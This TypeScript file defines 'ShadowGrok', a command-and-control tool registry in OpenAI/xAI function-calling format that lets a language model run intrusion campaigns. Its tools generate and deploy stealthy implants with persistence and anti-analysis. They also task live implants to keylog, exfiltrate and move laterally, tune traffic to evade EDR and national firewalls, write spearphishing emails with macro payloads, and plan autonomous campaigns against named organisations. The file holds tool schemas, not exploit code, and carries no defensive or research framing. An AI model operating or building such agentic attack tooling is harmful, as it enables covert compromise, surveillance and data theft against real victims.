/**
 * ShadowGrok C2 Tool Registry
 * Full implementation of rich C2 tools for natural language workflow orchestration
 * Compatible with OpenAI / xAI Grok tool calling format
 */

export interface ToolDefinition {
  type: "function";
  function: {
    name: string;
    description: string;
    parameters: {
      type: "object";
      properties: Record<string, any>;
      required?: string[];
    };
  };
}

export const SHADOWGROK_TOOLS: ToolDefinition[] = [
  {
    type: "function",
    function: {
      name: "generate_stealth_implant_config",
      description: "Generate a fully customized Go implant config with advanced stealth features (anti-analysis, traffic blending, jitter, encryption). Returns ready-to-compile JSON config.",
      parameters: {
        type: "object",
        properties: {
          target_os: { type: "string", enum: ["windows", "linux", "darwin"], description: "Target operating system" },
          stealth_level: { type: "string", enum: ["standard", "high", "maximum"], default: "high" },
          traffic_blend_profile: { type: "string", description: "e.g. 'spotify', 'discord', 'corporate_vpn', 'youtube', 'custom'" },
          custom_jitter_ms: { type: "string", description: "Jitter range e.g. '600-1800'" },
          enable_persistence: { type: "boolean", default: true },
          kill_switch_trigger: { type: "string", description: "e.g. '72h_no_beacon' or 'specific_date:2026-05-15'" },
          custom_sni: { type: "string", description: "Custom SNI for Cloudflare masquerade" }
        },
        required: ["target_os"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "compile_and_deploy_implant",
      description: "Compile the Go implant binary with the provided config, apply obfuscation, and deploy to the specified node. Returns deployment status and new implant ID.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string", description: "Target node ID from database (e.g. 'node_abc123')" },
          config: { type: "object", description: "Full implant config object returned by generate_stealth_implant_config" },
          build_flags: { type: "array", items: { type: "string" }, description: "Go build flags e.g. ['-tags=stealth', '-ldflags=-s -w']" },
          auto_start: { type: "boolean", default: true, description: "Automatically start the implant after deployment" }
        },
        required: ["node_id", "config"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "send_c2_task_to_implant",
      description: "Send a task (exec, screenshot, keylog, exfil, lateral movement, persistence, self-destruct, recon) to one or more live implants. Supports batching and scheduling.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { type: "array", items: { type: "string" }, description: "Array of implant IDs to target" },
          task_type: { 
            type: "string", 
            enum: ["exec", "download", "upload", "screenshot", "keylog", "lateral", "persist", "self_destruct", "recon", "sleep"] 
          },
          payload: { type: "object", description: "Task-specific payload (e.g. { command: 'whoami' }, { url: 'https://...' })" },
          timeout_seconds: { type: "number", default: 300 },
          scheduled_at: { type: "string", description: "ISO datetime for scheduled execution" }
        },
        required: ["implant_ids", "task_type"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "query_implant_status",
      description: "Query real-time status, last beacon time, active tasks, health metrics, and traffic stats for one or more implants.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { type: "array", items: { type: "string" } },
          include_traffic_stats: { type: "boolean", default: true },
          include_task_history: { type: "boolean", default: false }
        },
        required: ["implant_ids"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "trigger_kill_switch",
      description: "Trigger kill switch on implants, nodes, or globally. Supports immediate, graceful, scheduled, and dead-man modes with confirmation for high-risk scopes.",
      parameters: {
        type: "object",
        properties: {
          scope: { type: "string", enum: ["implant", "node", "global", "operation"] },
          target_ids: { type: "array", items: { type: "string" }, description: "Implant IDs, node IDs, or operation ID" },
          mode: { type: "string", enum: ["immediate", "graceful", "scheduled", "dead_man"] },
          reason: { type: "string", description: "Reason for kill switch activation (logged)" },
          confirmation_code: { type: "string", description: "Required confirmation code for global/immediate scope" },
          scheduled_at: { type: "string", description: "ISO datetime for scheduled kill switch" }
        },
        required: ["scope", "mode"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "analyze_traffic_and_suggest_evasion",
      description: "Analyze current Hysteria 2 traffic patterns on a node + optional external threat intel and return specific recommendations for better blending, new obfuscation, or protocol changes.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string", description: "Node ID to analyze" },
          time_window_hours: { type: "number", default: 24 },
          threat_model: { type: "string", description: "e.g. 'corporate_edr', 'national_firewall', 'isp_dpi', 'cloudflare'" },
          include_grok_threat_intel: { type: "boolean", default: true }
        },
        required: ["node_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "orchestrate_full_operation",
      description: "High-level autonomous planner. Takes a natural language operation goal and returns a complete phased campaign plan with exact tool calls, dependencies, and risk assessment. Use for complex multi-node campaigns.",
      parameters: {
        type: "object",
        properties: {
          operation_goal: { type: "string", description: "Natural language goal e.g. 'Establish persistent access in Acme Corp finance network with minimal detection risk and 72h dead-man switch'" },
          constraints: { type: "array", items: { type: "string" }, description: "Constraints e.g. ['no_persistence_on_critical_systems', 'avoid_monday_9am']" },
          max_phases: { type: "number", default: 6 },
          risk_tolerance: { type: "string", enum: ["low", "medium", "high"], default: "medium" }
        },
        required: ["operation_goal"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "run_panel_command",
      description: "Execute a shell command on the ShadowGrok panel server (restart services, rotate tokens, rebuild Docker, etc.). HIGH RISK — always requires explicit approval.",
      parameters: {
        type: "object",
        properties: {
          command: { type: "string", description: "Shell command to execute (e.g. 'systemctl restart hysteria-node-07')" },
          working_dir: { type: "string", default: "/home/workdir" },
          require_approval: { type: "boolean", default: true },
          timeout: { type: "number", default: 30 },
          dry_run: { type: "boolean", default: false }
        },
        required: ["command"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "update_node_config",
      description: "Dynamically update Hysteria 2 server configuration on a live node (ports, obfuscation method, rate limits, auth backend, etc.) and optionally hot-reload.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string" },
          config_patch: { type: "object", description: "Partial Hysteria YAML config to merge (e.g. { obfuscation: { type: 'salamander' } })" },
          hot_reload: { type: "boolean", default: true },
          restart_required: { type: "boolean", default: false }
        },
        required: ["node_id", "config_patch"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "query_hysteria_traffic_stats",
      description: "Fetch live traffic statistics, active connections, bandwidth usage, and error rates from the Hysteria Traffic Stats API for a specific node or globally.",
      parameters: {
        type: "object",
        properties: {
          node_id: { type: "string", description: "Leave empty for global stats" },
          metric: { type: "string", enum: ["connections", "bandwidth", "uptime", "errors", "all"], default: "all" },
          time_range_minutes: { type: "number", default: 60 }
        },
        required: []
      }
    }
  },

  {
    type: "function",
    function: {
      name: "create_or_update_subscription",
      description: "Create or update a client subscription profile with specific tags, formats, and expiration. Returns the subscription URL and token.",
      parameters: {
        type: "object",
        properties: {
          user_id: { type: "string" },
          tags: { type: "array", items: { type: "string" } },
          formats: { type: "array", items: { type: "string" }, default: ["hysteria2", "clash", "singbox"] },
          expires_at: { type: "string", description: "ISO datetime" },
          auto_rotate: { type: "boolean", default: true }
        },
        required: ["user_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "assess_opsec_risk",
      description: "Perform an OPSEC risk assessment on a proposed action or current node/implant state. Returns risk score (0-100), detected weaknesses, and mitigation recommendations.",
      parameters: {
        type: "object",
        properties: {
          action_description: { type: "string", description: "Description of the planned action" },
          target_node_id: { type: "string" },
          implant_id: { type: "string" },
          include_threat_model: { type: "boolean", default: true }
        },
        required: ["action_description"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "osint_domain_enum",
      description: "Perform OSINT domain enumeration on a target. Returns subdomains, DNS records, WHOIS data, and discovered services for reconnaissance.",
      parameters: {
        type: "object",
        properties: {
          domain: { type: "string", description: "Target domain to enumerate (e.g. 'target.com')" },
          include_subdomains: { type: "boolean", default: true },
          include_dns_records: { type: "boolean", default: true },
          include_whois: { type: "boolean", default: true },
          deep_scan: { type: "boolean", default: false }
        },
        required: ["domain"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "generate_spearphish",
      description: "Generate a customized spearphishing email template with payload attachment or link. Returns email template, attachment metadata, and delivery strategy.",
      parameters: {
        type: "object",
        properties: {
          target_profile: { type: "object", description: "Target info (industry, role, language, known contacts)" },
          payload_type: { type: "string", enum: ["attachment", "link", "macro_doc"], description: "Delivery mechanism" },
          pretext: { type: "string", description: "Social engineering pretext (e.g. 'invoice', 'job offer')" },
          urgency_level: { type: "string", enum: ["low", "medium", "high"], default: "medium" }
        },
        required: ["target_profile", "payload_type"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "deploy_nodes",
      description: "Deploy Hysteria 2 C2 nodes to cloud providers (Vultr, Azure, Hetzner, DigitalOcean, AWS Lightsail). Provisions actual VPS instances, installs Hysteria2, and registers them in the database. Returns deployment ID for tracking progress.",
      parameters: {
        type: "object",
        properties: {
          provider: { 
            type: "string", 
            enum: ["hetzner", "digitalocean", "vultr", "lightsail", "azure"],
            description: "Cloud provider to use for deployment" 
          },
          region: { type: "string", description: "Target region (provider-specific, e.g. 'ewr' for Vultr, 'eastus' for Azure)" },
          size: { type: "string", description: "Instance size/plan (provider-specific, e.g. 'vc2-1c-1gb' for Vultr, 'Standard_B1s' for Azure)" },
          name: { type: "string", description: "Node name (max 120 chars)" },
          domain: { type: "string", description: "Optional domain for TLS (required for Let's Encrypt)" },
          port: { type: "number", default: 443, description: "Hysteria2 listen port (default: 443)" },
          obfs_password: { type: "string", description: "Obfuscation password (enables salamander obfs)" },
          email: { type: "string", description: "Email for ACME/Let's Encrypt (required if using domain)" },
          tags: { type: "array", items: { type: "string" }, description: "Tags for the node" },
          bandwidth_up: { type: "string", description: "Upload bandwidth limit (e.g. '100 Mbps')" },
          bandwidth_down: { type: "string", description: "Download bandwidth limit (e.g. '1 Gbps')" },
          panel_url: { type: "string", description: "Panel URL for auth backend (default: derived from request)" }
        },
        required: ["provider", "region", "size", "name"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "get_deployment_status",
      description: "Get the current status of a deployment initiated by deploy_nodes. Returns deployment status, steps completed, VPS ID/IP, and node ID if registered.",
      parameters: {
        type: "object",
        properties: {
          deployment_id: { type: "string", description: "Deployment ID returned by deploy_nodes" }
        },
        required: ["deployment_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "list_implants",
      description: "List all implants with optional filtering by status, type, architecture, or node. Returns paginated results with implant details and health status.",
      parameters: {
        type: "object",
        properties: {
          status: { type: "string", enum: ["active", "inactive", "compromised"], description: "Filter by implant status" },
          type: { type: "string", description: "Filter by implant type" },
          architecture: { type: "string", description: "Filter by architecture (windows, linux, darwin)" },
          node_id: { type: "string", description: "Filter by node ID" },
          limit: { type: "number", default: 50, description: "Maximum number of results" },
          offset: { type: "number", default: 0, description: "Offset for pagination" }
        }
      }
    }
  },

  {
    type: "function",
    function: {
      name: "delete_implant",
      description: "Delete an implant record. This removes the implant from the database but does not remotely uninstall it. Use with caution.",
      parameters: {
        type: "object",
        properties: {
          implant_id: { type: "string", description: "Implant ID to delete" },
          force: { type: "boolean", default: false, description: "Force delete even if implant has active tasks" }
        },
        required: ["implant_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "update_implant_config",
      description: "Update implant configuration including stealth settings, transport config, or metadata. Supports partial updates.",
      parameters: {
        type: "object",
        properties: {
          implant_id: { type: "string", description: "Implant ID to update" },
          config_patch: { type: "object", description: "Partial config to merge (e.g. { stealth: { level: 'maximum' } })" },
          transport_config_patch: { type: "object", description: "Partial transport config to merge" },
          status: { type: "string", enum: ["active", "inactive", "compromised"], description: "Update implant status" }
        },
        required: ["implant_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "implant_health_monitor",
      description: "Get detailed health metrics for implants including beacon history, task success rate, and anomaly detection. Returns health scores and recommendations.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { type: "array", items: { type: "string" }, description: "Array of implant IDs to monitor" },
          time_range_hours: { type: "number", default: 24, description: "Time range for health analysis" },
          include_recommendations: { type: "boolean", default: true, description: "Include health improvement recommendations" }
        },
        required: ["implant_ids"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "bulk_implant_operation",
      description: "Execute a bulk operation on multiple implants at once (update config, change status, send task, etc.). Returns results for each implant.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { type: "array", items: { type: "string" }, description: "Array of implant IDs to target" },
          operation: { type: "string", enum: ["update_config", "change_status", "send_task", "delete"], description: "Operation type" },
          operation_params: { type: "object", description: "Operation-specific parameters" },
          continue_on_error: { type: "boolean", default: true, description: "Continue with remaining implants if one fails" }
        },
        required: ["implant_ids", "operation"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "list_subscriptions",
      description: "List all subscriptions with optional filtering by user, status, or tags. Returns subscription details and usage statistics.",
      parameters: {
        type: "object",
        properties: {
          user_id: { type: "string", description: "Filter by user ID" },
          status: { type: "string", enum: ["active", "expired", "revoked", "suspended"], description: "Filter by status" },
          tags: { type: "array", items: { type: "string" }, description: "Filter by tags" },
          limit: { type: "number", default: 50, description: "Maximum number of results" },
          offset: { type: "number", default: 0, description: "Offset for pagination" }
        }
      }
    }
  },

  {
    type: "function",
    function: {
      name: "get_subscription",
      description: "Get detailed information about a specific subscription including usage stats, metadata, and configuration.",
      parameters: {
        type: "object",
        properties: {
          subscription_id: { type: "string", description: "Subscription ID" },
          token: { type: "string", description: "Alternatively, look up by token" }
        }
      }
    }
  },

  {
    type: "function",
    function: {
      name: "delete_subscription",
      description: "Delete a subscription permanently. This removes access immediately. Use revoke_subscription for safer access revocation.",
      parameters: {
        type: "object",
        properties: {
          subscription_id: { type: "string", description: "Subscription ID to delete" }
        },
        required: ["subscription_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "revoke_subscription",
      description: "Revoke subscription access safely. Marks subscription as revoked with reason and timestamp. Can be undone by reactivating.",
      parameters: {
        type: "object",
        properties: {
          subscription_id: { type: "string", description: "Subscription ID to revoke" },
          reason: { type: "string", description: "Reason for revocation (logged)" }
        },
        required: ["subscription_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "subscription_analytics",
      description: "Get subscription analytics including usage trends, growth metrics, and performance data over a specified time range.",
      parameters: {
        type: "object",
        properties: {
          time_range_days: { type: "number", default: 30, description: "Time range in days for analytics" },
          include_usage_breakdown: { type: "boolean", default: true, description: "Include per-subscription usage breakdown" }
        }
      }
    }
  },

  {
    type: "function",
    function: {
      name: "rotate_subscription_token",
      description: "Rotate a subscription's access token for security. Invalidates old token and generates new one. Returns new token.",
      parameters: {
        type: "object",
        properties: {
          subscription_id: { type: "string", description: "Subscription ID to rotate token for" },
          notify_user: { type: "boolean", default: true, description: "Send notification to user about token rotation" }
        },
        required: ["subscription_id"]
      }
    }
  }
];

// Helper to get tool by name
export function getToolByName(name: string): ToolDefinition | undefined {
  return SHADOWGROK_TOOLS.find(t => t.function.name === name);
}

// List of all tool names (useful for allowedTools validation)
export const ALL_TOOL_NAMES = SHADOWGROK_TOOLS.map(t => t.function.name);